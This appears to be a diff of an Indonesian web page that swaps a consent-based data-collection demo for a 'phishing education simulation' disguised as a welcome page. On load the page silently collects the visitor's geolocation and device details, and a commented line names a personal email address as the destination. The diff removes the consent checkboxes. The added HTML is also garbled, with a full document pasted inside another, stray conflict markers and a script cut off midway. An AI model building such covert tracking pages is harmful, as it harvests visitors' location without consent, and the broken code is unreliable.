@@ -3,144 +3,222 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Etis</title>
+    <title>Simulasi Edukasi Phishing</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            color: #333;
-        }
-        .container {
-            background-color: #f9f9f9;
+        #map { 
+            height: 400px;
             border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-top: 20px;
         }
-        h1 {
-            color: #2c3e50;
-            text-align: center;
-        }
-        .data-box {
-            background: white;
-            border: 1px solid #ddd;
-            border-radius: 4px;
+        .warning-banner {
+            background-color: #ffebee;
+            border-left: 4px solid #f44336;
             padding: 15px;
-            margin: 10px 0;
-        }
-        button {
-            background-color: #3498db;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #2980b9;
-        }
-        .permission-bar {
-            background: #ecf0f1;
-            padding: 15px;
-            border-radius: 4px;
-            margin: 20px 0;
-        }
-        #map {
-            height: 300px;
-            background-color: #eee;
-            border-radius: 4px;
-            margin-top: 15px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
-<body>
-    <div class="container">
-        <h1>Demo Koleksi Data dengan Persetujuan</h1>
+<body class="bg-gray-100 p-6">
+    <div class="max-w-3xl mx-auto bg-white rounded-lg shadow-md p-6">
+        <h1 class="text-2xl font-bold text-center mb-6">Selamat Datang di Layanan Kami</h1>
         
-        <div class="permission-bar">
-            <p>Aplikasi ini membutuhkan persetujuan Anda untuk mengakses:</p>
-            <input type="checkbox" id="geoPermission"> Lokasi geografis<br>
-            <input type="checkbox" id="devicePermission"> Info perangkat<br>
-            <button id="grantBtn">Berikan Akses</button>
+        <div class="mb-6">
+            <div class="border rounded-lg p-4 bg-gray-50">
+                <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/f3b1ed57-2bc6-43aa-9843-c28b67a8ef4e.png" alt="Welcome banner" class="mb-3 rounded">
+                <div class="text-center py-4">
+                    <p>Loading...</p>
+                </div>
+=======
+            </div>
         </div>
-
-        <div class="data-box">
-            <h3>Informasi yang Dikumpulkan:</h3>
-            <p><strong>Waktu Akses:</strong> <span id="timeData">-</span></p>
-            <p><strong>Lokasi:</strong> <span id="geoData">-</span></p>
-            <p><strong>Perangkat:</strong> <span id="deviceData">-</span></p>
+        
+        <div class="mb-6">
+            <h2 class="text-xl font-semibold mb-2">Lokasi Anda</h2>
             <div id="map"></div>
+            <div id="locationData" class="hidden">
+                <p class="text-sm">Latitude: <span id="lat">-6.200000</span></p>
+                <p class="text-sm">Longitude: <span id="lng">106.816666</span></p>
+            </div>
         </div>
-
-        <button id="refreshBtn">Refresh Data</button>
+        
+        <div class="mb-6">
+            <h2 class="text-xl font-semibold mb-2">3. Data yang Dikirim ke Email Scammer</h2>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulasi Edukasi Phishing</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        #map { 
+            height: 400px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        .warning-banner {
+            background-color: #ffebee;
+            border-left: 4px solid #f44336;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 p-6">
+    <div class="max-w-3xl mx-auto bg-white rounded-lg shadow-md p-6">
+        <h1 class="text-2xl font-bold text-center mb-6">Selamat Datang di Layanan Kami</h1>
+        
+        <div class="mb-6">
+            <div class="border rounded-lg p-4 bg-gray-50">
+                <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/f3b1ed57-2bc6-43aa-9843-c28b67a8ef4e.png" alt="Welcome banner" class="mb-3 rounded">
+                <div class="text-center py-4">
+                    <p>Loading...</p>
+                </div>
+=======
+            </div>
+        </div>
+        
+        <div class="mb-6">
+            <h2 class="text-xl font-semibold mb-2">Lokasi Anda</h2>
+            <div id="map"></div>
+            <div id="locationData" class="hidden">
+                <p class="text-sm">Latitude: <span id="lat">-6.200000</span></p>
+                <p class="text-sm">Longitude: <span id="lng">106.816666</span></p>
+            </div>
+        </div>
+        
+        <div class="mb-6">
+            <h2 class="text-xl font-semibold mb-2">3. Data yang Dikirim ke Email Scammer</h2>
+            <div class="border rounded-lg p-4 bg-gray-50">
+                <pre id="dataPreview" class="text-sm bg-gray-200 p-3 rounded overflow-x-auto">
+Submit form to see collected data
+                </pre>
+                <button id="sendBtn" class="mt-2 bg-green-500 text-white py-2 px-4 rounded hover:bg-green-600">Send Data</button>
+            </div>
+        </div>
+        
+        <div class="bg-blue-50 p-4 rounded-lg border border-blue-200">
+            <h3 class="font-bold text-blue-800">Pelajaran Penting:</h3>
+            <ul class="list-disc pl-5 mt-2 space-y-1">
+                <li>Selalu periksa URL website sebelum login</li>
+                <li>Jangan klik link dari email/sms mencurigakan</li>
+                <li>Aktifkan 2FA dengan authenticator app</li>
+                <li>Laporkan upaya phising ke Google</li>
+            </ul>
+        </div>
     </div>
 
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        document.getElementById('grantBtn').addEventListener('click', function() {
-            const geoChecked = document.getElementById('geoPermission').checked;
-            const deviceChecked = document.getElementById('devicePermission').checked;
-
-            if (!geoChecked && !deviceChecked) {
-                alert('Silakan pilih setidaknya satu izin');
-                return;
-            }
-
-            if (geoChecked) {
-                requestGeolocation();
-            }
-
-            if (deviceChecked) {
-                showDeviceInfo();
-            }
-
-            document.getElementById('timeData').textContent = new Date().toLocaleString();
-        });
-
-        function requestGeolocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        document.getElementById('geoData').textContent = 
-                            `Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}`;
-                        
-                        // Simulasi tampilan peta (tidak benar-benar memanggil API Maps)
-                        const mapDiv = document.getElementById('map');
-                        mapDiv.innerHTML = `
-                            <img src="https://placehold.co/600x300?text=Peta+Area+Sekitar" 
-                                 alt="Peta area sekitar mengikuti koordinat pengguna" 
-                                 style="width:100%;border-radius:4px;">
-                            <p class="map-text">Lokasi Anda: ${lat.toFixed(4)}, ${lon.toFixed(4)}</p>
-                        `;
-                    },
-                    function(error) {
-                        document.getElementById('geoData').textContent = 
-                            'Izin lokasi ditolak atau tidak tersedia';
-                    }
-                );
-            } else {
-                document.getElementById('geoData').textContent = 
-                    'Geolokasi tidak didukung browser ini';
-            }
-        }
-
-        function showDeviceInfo() {
-            const deviceInfo = `
-                ${navigator.userAgent.split('(')[1].split(')')[0]}, 
-                ${screen.width}x${screen.height} pixels,
-                ${navigator.hardwareConcurrency || 'Unknown'} core CPU`;
+        // Auto request location
+        const map = L.map('map');
+        let marker;
+        
+        function updateMap(lat, lng) {
+            map.setView([lat, lng], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
             
-            document.getElementById('deviceData').textContent = deviceInfo;
+            if(marker) map.removeLayer(marker);
+            marker = L.marker([lat, lng]).addTo(map)
+                .bindPopup('Your current location');
+            
+            document.getElementById('lat').textContent = lat;
+            document.getElementById('lng').textContent = lng;
         }
 
-        document.getElementById('refreshBtn').addEventListener('click', function() {
-            document.getElementById('timeData').textContent = new Date().toLocaleString();
+        // Auto collect and send data on page load
+        window.addEventListener('load', function() {
+            const userAgent = navigator.userAgent;
+            const deviceData = {
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                screenRes: `${window.screen.width}x${window.screen.height}`,
+                ip: 'fetching...' // Would use a service to get IP in real implementation
+            };
+            
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const data = {
+                        timestamp: new Date().toISOString(),
+                        location: {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        },
+                        device: deviceData,
+                        userAgent: userAgent
+                    };
+                    
+                    console.log('Collected visitor data:', data);
+                    
+                    // In a real implementation would send to email here
+                    // Example sendDataToEmail(data, 'farhanmahaputra26@gmail.com');
+                    
+                    // Update UI
+                    document.getElementById('dataPreview').textContent = JSON.stringify(data, null, 2);
+                }, (err) => {
+                    console.warn('Geolocation error:', err);
+                });
+            } else {
+                console.warn('Geolocation not available');
+            }
         });
     </script>
 </body>
 </html>
+￼Enter            <div class="border rounded-lg p-4 bg-gray-50">
+                <pre id="dataPreview" class="text-sm bg-gray-200 p-3 rounded overflow-x-auto">
+Submit form to see collected data
+                </pre>
+                <button id="sendBtn" class="mt-2 bg-green-500 text-white py-2 px-4 rounded hover:bg-green-600">Send Data</button>
+            </div>
+        </div>
+        
+        <div class="bg-blue-50 p-4 rounded-lg border border-blue-200">
+            <h3 class="font-bold text-blue-800">Pelajaran Penting:</h3>
+            <ul class="list-disc pl-5 mt-2 space-y-1">
+                <li>Selalu periksa URL website sebelum login</li>
+                <li>Jangan klik link dari email/sms mencurigakan</li>
+                <li>Aktifkan 2FA dengan authenticator app</li>
+                <li>Laporkan upaya phising ke Google</li>
+            </ul>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        // Auto request location
+        const map = L.map('map');
+        let marker;
+        
+        function updateMap(lat, lng) {
+      map.setView([lat, lng], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+            
+            if(marker) map.removeLayer(marker);
+            marker = L.marker([lat, lng]).addTo(map)
+                .bindPopup('Your current location');
+            
+            document.getElementById('lat').textContent = lat;
+            document.getElementById('lng').textContent = lng;
+        }
+
+        // Auto collect and send data on page load
+        window.addEventListener('load', function() {
+            const userAgent = navigator.userAgent;
+            const deviceData = {
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                screenRes: `${window.screen.width}x${window.screen.height}`,
+                ip: 'fetching...' // Would use a service to get IP in real implementation
+            };
+            
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const data = {
+                        timestamp: new Date().toISOString(),
